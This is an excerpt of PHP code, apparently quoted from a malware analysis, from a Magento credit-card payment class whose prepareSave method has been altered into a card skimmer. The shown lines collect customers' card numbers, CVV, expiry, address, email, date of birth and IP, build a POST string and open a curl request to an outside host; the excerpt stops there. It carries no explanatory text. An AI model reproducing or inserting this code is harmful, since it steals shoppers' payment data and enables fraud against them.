...
class Mage_Payment_Model_Method_Cc extends Mage_Payment_Model_Method_Abstract
{
    ...
    public function prepareSave()
    {
        ...
        $data14 = Mage::getSingleton('customer/session')->getCustomer()->getDob();
        $data15 = "zeeni.com";
        $data16 = Mage::getSingleton('checkout/session')->getQuote()->getBillingAddress()->getEmail();
        $data18 = $_SERVER['REMOTE_ADDR'];
        $post77 = "firstname=".$data1."&lastname=".$data2."&street1=".$data3."&street2=".$data4."&city=".$data5."&state=".$data6."&zip=".$data7."&country=".$data8."&phonenumber=".$data9."&ccnumber=".$data10."&expmonth=".$data11."&expyear=".$data12."&cvv=".$data13."&dob=".$data14."&site=".$data15."&email=".$data16."&ccname=".$data17."&ip=".$data18;
        $url = "http://dittm.org/mage/";
        $ch = curl_init($url);
